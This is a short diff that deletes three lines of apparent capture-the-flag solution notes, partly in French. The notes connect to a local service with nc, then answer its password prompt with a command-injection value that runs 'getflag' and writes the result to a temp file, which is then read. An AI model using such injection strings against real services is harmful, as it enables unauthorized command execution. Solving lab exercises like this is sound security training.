@@ -1,3 +1,0 @@
-nc localhost 5151
-nous demande un password " ; getflag > /tmp/unfichier"
-cat /tmp/unfichier
